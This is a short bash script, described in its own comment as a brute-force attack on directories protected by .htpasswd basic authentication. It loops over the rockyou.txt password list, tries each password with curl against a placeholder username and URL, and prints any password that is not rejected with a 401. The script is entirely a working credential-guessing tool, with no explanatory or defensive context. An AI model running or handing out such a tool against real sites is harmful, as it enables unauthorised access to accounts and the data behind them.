#!/usr/bin/env bash
# Brute force against .htpassword locked directories

while read line;do
	statuscode=$(curl -s -o /dev/null -w "%{http_code}\n" -u USERNAME:$line YOUR_URL)
	if [[ $statuscode != "401" ]];then
		echo $line
	fi
done < rockyou.txt
